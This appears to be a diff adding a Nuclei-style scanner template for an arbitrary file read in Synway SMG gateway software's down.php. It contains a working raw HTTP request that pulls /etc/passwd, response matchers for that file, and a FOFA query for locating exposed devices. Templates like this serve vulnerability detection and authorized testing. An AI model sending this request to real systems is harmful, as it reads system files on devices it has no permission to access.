@@ -1,0 +1,51 @@
+http:
+    - matchers:
+        - part: body
+          regex:
+            - 'root:.*:0:0:'
+          type: regex
+        - condition: and
+          part: header
+          type: word
+          words:
+            - application/octet-stream
+            - filename=passwd
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /down.php HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfA9vzLuw6Gmtnmv2
+
+          ------WebKitFormBoundaryfA9vzLuw6Gmtnmv2
+          Content-Disposition: form-data; name="downfile"
+
+          /etc/passwd
+          ------WebKitFormBoundaryfA9vzLuw6Gmtnmv2
+          Content-Disposition: form-data; name="down"
+
+          下载
+          ------WebKitFormBoundaryfA9vzLuw6Gmtnmv2
+          Content-Disposition: form-data; name="runinfoupdate"
+
+          ------WebKitFormBoundaryfA9vzLuw6Gmtnmv2--
+id: sanhui-smg-file-read
+info:
+    author: SleepingBag945
+    description: |
+        There is an arbitrary file reading vulnerability in the down.php file of Synway SMG gateway management software, through which an attacker can download any file from the server.
+    metadata:
+        fofa-query: body="text ml10 mr20" && title="网关管理软件"
+        max-request: 1
+        verified: true
+    name: Synway SMG Gateway down.php - Arbitrary File Read
+    reference:
+        - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%89%E6%B1%87SMG%20%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%20down.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+    severity: high
+    tags:
+        - sanhui-smg
+        - gateway
+        - intrusive
